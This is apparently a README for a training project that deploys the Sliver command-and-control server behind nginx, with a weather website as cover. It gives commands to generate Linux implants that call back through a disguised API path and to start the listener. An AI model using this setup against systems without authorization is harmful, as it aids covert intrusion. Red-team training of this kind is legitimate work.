# Sliver C2 Training Environment

A Docker Compose deployment showcasing the Sliver C2 framework for cybersecurity training and demonstration purposes. This environment includes a weather website as a cover application, nginx as a reverse proxy, and Sliver C2 server for command and control operations.

## Overview

This project demonstrates how Sliver C2 can be deployed alongside legitimate web services to provide a realistic training environment for cybersecurity professionals. The setup includes:

- **Nginx**: Reverse proxy handling HTTPS termination and routing
- **Weather Site**: Legitimate-looking weather application serving as a cover
- **Sliver C2**: Command and control framework for adversary simulation

## Architecture

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ HTTPS (443)
       ▼
┌─────────────┐
│   Nginx     │ (Reverse Proxy)
│  Port 80/443│
└──────┬──────┘
       │
       ├──────► Weather App (Port 5000) - /weather/
       │
       └──────► Sliver C2 (Port 8080) - /api/current/
```

## Prerequisites

- Docker and Docker Compose installed
- Open ports 80 and 443 on your host
- SSL certificates (self-signed certificates work for testing)
- Domain name or IP address configured (default: `ubu.jon.devs`)

## Quick Start

### 1. Clone and Navigate

```bash
git clone <your-repo-url>
cd sliver-weather
```

### 2. SSL Certificate Setup

Place your SSL certificates in `nginx/certs/`:
- `ubu.jon.devs.crt` - SSL certificate
- `ubu.jon.devs.key` - Private key

For testing, you can generate self-signed certificates:

```bash
cd nginx/certs
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout ubu.jon.devs.key \
  -out ubu.jon.devs.crt \
  -subj "/CN=ubu.jon.devs"
```

### 3. Start the Services

```bash
docker compose up -d
```

### 4. Access Sliver Server

```bash
docker compose exec -it sliver /bin/bash
```

### 5. Start Sliver Server

Inside the container:

```bash
/opt/sliver-server
```

### 6. Generate an Implant

In the Sliver console, generate a Linux implant:

```bash
generate --http https://ubu.jon.devs:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
```

**Note**: Replace `ubu.jon.devs` with your actual domain or IP address.

### 7. Start HTTP Listener

Start the HTTP listener on port 8080 (mapped through nginx):

```bash
http --lport 8080 --lhost 0.0.0.0
```

## Usage

### Accessing Services

- **Weather App**: `https://your-domain/weather/`
- **Weather API**: `https://your-domain/api/weather?q=<location>`
- **Sliver C2 Endpoint**: `https://your-domain/api/current/` (for implants)

### Building Implants

Implants are saved to the `builds/` directory, which is mounted as a volume. You can access them from the host at:

```bash
ls -la builds/
```

### Viewing Logs

```bash
# All services
docker compose logs -f

# Specific service
docker compose logs -f nginx
docker compose logs -f weather
docker compose logs -f sliver
```

### Stopping Services

```bash
docker compose down
```

### Cleaning Up

To remove all containers, networks, and volumes:

```bash
docker compose down -v
```

## Configuration

### Nginx

The nginx configuration is located at `nginx/nginx.conf`. Key settings:

- HTTP to HTTPS redirect on port 80
- SSL/TLS configuration for port 443
- Routing rules for weather app and Sliver C2
- Server name: `ubu.jon.devs` (update for your domain)

### Docker Compose

The `docker-compose.yml` file defines:

- **nginx**: Exposes ports 80 and 443
- **weather**: Weather application service
- **sliver**: Sliver C2 server with volumes for config and builds

### Environment Variables

Sliver service environment variables:
- `SLIVER_HTTP_PORT`: HTTP listener port (default: 8080)
- `SLIVER_AUTOSTART_HTTP`: Auto-start HTTP listener (set to "1" to enable)

### Volumes

- `~/.sliver`: Sliver configuration and certificates
- `./builds`: Generated implant binaries

## Security Considerations

⚠️ **This is a training/demonstration environment. Do not deploy in production without proper security hardening.**

1. **SSL Certificates**: Use proper certificates, not self-signed for production
2. **Network Isolation**: Consider running in an isolated network
3. **Access Control**: Limit access to the Sliver server
4. **Logging**: Monitor and log all activities
5. **Firewall**: Restrict access to necessary ports only

## Troubleshooting

### Cannot connect to Sliver

- Verify the HTTP listener is running: `http --lport 8080 --lhost 0.0.0.0`
- Check nginx logs: `docker compose logs nginx`
- Verify routing in nginx.conf matches your implant URL

### SSL Certificate Errors

- Ensure certificates are in `nginx/certs/` directory
- Check certificate file permissions
- Verify certificate matches the server name in nginx.conf

### Implant Not Connecting

- Verify the URL in the `generate` command matches your domain
- Check that nginx is routing `/api/current/` correctly
- Ensure the HTTP listener is active in Sliver

### Port Conflicts

- Check if ports 80 or 443 are already in use: `sudo netstat -tulpn | grep -E ':(80|443)'`
- Modify port mappings in docker-compose.yml if needed

## Project Structure

```
sliver-weather/
├── docker-compose.yml      # Main orchestration file
├── nginx/
│   ├── nginx.conf          # Nginx configuration
│   ├── certs/              # SSL certificates
│   └── Dockerfile          # Nginx Dockerfile (if custom)
├── weather/
│   ├── Dockerfile          # Weather app Dockerfile
│   ├── server.js           # Weather API server
│   ├── package.json        # Node.js dependencies
│   └── public/             # Frontend files
├── sliver/
│   ├── Dockerfile          # Sliver Dockerfile
│   └── docker-entrypoint.sh # Entrypoint script
├── builds/                 # Generated implants (created at runtime)
└── README.md              # This file
```

## Contributing

This is a training/demonstration project. Contributions and improvements are welcome!

## License

Please ensure compliance with local laws and regulations when using C2 frameworks. This project is for educational and authorized security testing purposes only.

## References

- [Sliver Framework](https://github.com/BishopFox/sliver)
- [Nginx Documentation](https://nginx.org/en/docs/)
- [Docker Compose Documentation](https://docs.docker.com/compose/)

## Support

For issues specific to:
- **Sliver**: Check the [Sliver documentation](https://github.com/BishopFox/sliver/wiki)
- **Docker**: Check Docker and Docker Compose logs
- **Nginx**: Check nginx logs and configuration syntax

---

**Disclaimer**: This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only in environments you own or have explicit permission to test.

